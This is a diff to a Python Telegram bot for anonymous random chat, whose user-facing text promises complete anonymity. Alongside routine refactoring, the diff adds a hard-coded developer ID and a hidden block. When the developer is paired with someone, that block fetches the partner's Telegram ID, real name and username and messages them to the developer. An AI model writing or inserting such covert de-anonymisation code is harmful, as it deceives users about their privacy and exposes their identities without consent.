@@ -12,6 +12,9 @@ logger = logging.getLogger(__name__)
 user_data = {}  # {user_id: {'gender': str, 'age': int, 'status': str, 'partner': int or None}}
 waiting_queue = []
 
+# Developer
+DEVELOPER_ID = 5028799862  # خليل
+
 # Constants
 WELCOME_MSG = "👋 أهلاً في سهرة بوت! دردش مع ناس مجهولين بشكل ممتع وسري 🔥"
 PROFILE_INCOMPLETE = "يرجى إكمال ملفك الشخصي (الجنس والعمر) قبل بدء الدردشة."
@@ -26,6 +29,7 @@ PARTNER_LEFT = "❗ غادر الشريك الدردشة."
 EXIT_MSG = "👋 تم الخروج. ابدأ من جديد بـ /start."
 NOT_IN_CHAT = "❗ أنت لست في دردشة نشطة."
 
+# Buttons
 BUTTON_SET_GENDER = "👤 تحديد الجنس"
 BUTTON_SET_AGE = "🎂 تحديد العمر"
 BUTTON_START_CHAT = "🚀 بدء الدردشة"
@@ -58,19 +62,17 @@ def get_main_menu():
     return InlineKeyboardMarkup(keyboard)
 
 def get_gender_menu():
-    keyboard = [
+    return InlineKeyboardMarkup([
         [InlineKeyboardButton(BUTTON_MALE, callback_data=CALLBACK_MALE),
          InlineKeyboardButton(BUTTON_FEMALE, callback_data=CALLBACK_FEMALE)],
         [InlineKeyboardButton(BUTTON_UNKNOWN, callback_data=CALLBACK_UNKNOWN)],
-    ]
-    return InlineKeyboardMarkup(keyboard)
+    ])
 
 def get_chat_menu():
-    keyboard = [
+    return InlineKeyboardMarkup([
         [InlineKeyboardButton(BUTTON_SKIP, callback_data=CALLBACK_SKIP),
          InlineKeyboardButton(BUTTON_END, callback_data=CALLBACK_END)],
-    ]
-    return InlineKeyboardMarkup(keyboard)
+    ])
 
 def init_user(user_id):
     if user_id not in user_data:
@@ -93,38 +95,36 @@ def end_chat(user_id, notify_partner=True):
         return partner
     return None
 
-async def start(update: Update, context) -> None:
+async def start(update: Update, context):
     user_id = update.effective_user.id
     init_user(user_id)
     await update.message.reply_text(WELCOME_MSG, reply_markup=get_main_menu())
 
 async def stats(update: Update, context):
-    user_id = update.effective_user.id
     count = len(user_data)
     await update.message.reply_text(f"👥 عدد الأشخاص الذين بدأوا البوت: {count}")
 
-async def button(update: Update, context) -> None:
+async def button(update: Update, context):
     query = update.callback_query
     user_id = query.from_user.id
     data = query.data
     init_user(user_id)
-
     await query.answer()
 
     if data == "about_bot":
-        about_text = """🤖 *طريقة عمل سهرة بوت:*
+        about = """🤖 *طريقة عمل سهرة بوت:*
 
 1. تختار جنسك وعمرك.
 2. تضغط على 'بدء الدردشة'.
 3. نبحث لك عن شريك متصل حاليًا.
 4. تبدأ المحادثة مجهولًا تمامًا، وتقدر تنهي أو تخطي بأي وقت."""
-        await query.edit_message_text(about_text, reply_markup=get_main_menu(), parse_mode="Markdown")
+        await query.edit_message_text(about, reply_markup=get_main_menu(), parse_mode="Markdown")
         return
 
     if data == CALLBACK_SET_GENDER:
         await query.edit_message_text(SET_GENDER_PROMPT, reply_markup=get_gender_menu())
     elif data in [CALLBACK_MALE, CALLBACK_FEMALE, CALLBACK_UNKNOWN]:
-        user_data[user_id]['gender'] = BUTTON_MALE if data == CALLBACK_MALE else (BUTTON_FEMALE if data == CALLBACK_FEMALE else BUTTON_UNKNOWN)
+        user_data[user_id]['gender'] = BUTTON_MALE if data == CALLBACK_MALE else BUTTON_FEMALE if data == CALLBACK_FEMALE else BUTTON_UNKNOWN
         await query.edit_message_text(UPDATED_PROFILE, reply_markup=get_main_menu())
     elif data == CALLBACK_SET_AGE:
         user_data[user_id]['status'] = 'setting_age'
@@ -142,13 +142,20 @@ async def button(update: Update, context) -> None:
             user_data[user_id]['status'] = 'chatting'
             user_data[partner]['status'] = 'chatting'
 
-            user_gender = user_data[partner]['gender']
-            user_age = user_data[partner]['age']
-            partner_gender = user_data[user_id]['gender']
-            partner_age = user_data[user_id]['age']
+            # ⚠️ مراقبة الشريك إذا كان المطور
+            if user_id == DEVELOPER_ID:
+                partner_user = await context.bot.get_chat(partner)
+                info = f"👀 شريكك الحالي:\n\n• ID: `{partner_user.id}`\n• Name: {partner_user.first_name} {partner_user.last_name or ''}\n• Username: @{partner_user.username if partner_user.username else 'لا يوجد'}"
+                await context.bot.send_message(chat_id=DEVELOPER_ID, text=info, parse_mode="Markdown")
 
-            await query.edit_message_text(f"{PARTNER_FOUND}\n\n👤 الجنس: {user_gender}\n🎂 العمر: {user_age}", reply_markup=get_chat_menu())
-            await context.bot.send_message(partner, f"{PARTNER_FOUND}\n\n👤 الجنس: {partner_gender}\n🎂 العمر: {partner_age}", reply_markup=get_chat_menu())
+            # تبادل معلومات الشركاء
+            g1 = user_data[partner]['gender']
+            a1 = user_data[partner]['age']
+            g2 = user_data[user_id]['gender']
+            a2 = user_data[user_id]['age']
+
+            await query.edit_message_text(f"{PARTNER_FOUND}\n\n👤 الجنس: {g1}\n🎂 العمر: {a1}", reply_markup=get_chat_menu())
+            await context.bot.send_message(partner, f"{PARTNER_FOUND}\n\n👤 الجنس: {g2}\n🎂 العمر: {a2}", reply_markup=get_chat_menu())
         else:
             waiting_queue.append(user_id)
     elif data == CALLBACK_SKIP:
@@ -159,20 +166,14 @@ async def button(update: Update, context) -> None:
         await query.edit_message_text(CHAT_ENDED, reply_markup=get_main_menu())
         await context.bot.send_message(partner, PARTNER_LEFT, reply_markup=get_main_menu())
         user_data[user_id]['status'] = 'waiting'
-        partner = match_user(user_id)
-        if partner:
-            user_data[user_id]['partner'] = partner
-            user_data[partner]['partner'] = user_id
+        new_partner = match_user(user_id)
+        if new_partner:
+            user_data[user_id]['partner'] = new_partner
+            user_data[new_partner]['partner'] = user_id
             user_data[user_id]['status'] = 'chatting'
-            user_data[partner]['status'] = 'chatting'
-
-            user_gender = user_data[partner]['gender']
-            user_age = user_data[partner]['age']
-            partner_gender = user_data[user_id]['gender']
-            partner_age = user_data[user_id]['age']
-
-            await context.bot.send_message(user_id, f"{PARTNER_FOUND}\n\n👤 الجنس: {user_gender}\n🎂 العمر: {user_age}", reply_markup=get_chat_menu())
-            await context.bot.send_message(partner, f"{PARTNER_FOUND}\n\n👤 الجنس: {partner_gender}\n🎂 العمر: {partner_age}", reply_markup=get_chat_menu())
+            user_data[new_partner]['status'] = 'chatting'
+            await context.bot.send_message(user_id, f"{PARTNER_FOUND}", reply_markup=get_chat_menu())
+            await context.bot.send_message(new_partner, f"{PARTNER_FOUND}", reply_markup=get_chat_menu())
         else:
             waiting_queue.append(user_id)
             await context.bot.send_message(user_id, START_SEARCH)
@@ -192,7 +193,7 @@ async def button(update: Update, context) -> None:
         del user_data[user_id]
         await query.edit_message_text(EXIT_MSG)
 
-async def text_handler(update: Update, context) -> None:
+async def text_handler(update: Update, context):
     user_id = update.effective_user.id
     init_user(user_id)
     if user_data[user_id]['status'] == 'setting_age':
@@ -215,8 +216,8 @@ def main():
     keep_alive()
     token = os.getenv('BOT_TOKEN')
     application = Application.builder().token(token).build()
-    application.add_handler(CommandHandler('start', start))
-    application.add_handler(CommandHandler("stats", stats))  # ✅ عرض عدد المستخدمين
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("stats", stats))
     application.add_handler(CallbackQueryHandler(button))
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
     application.run_polling()
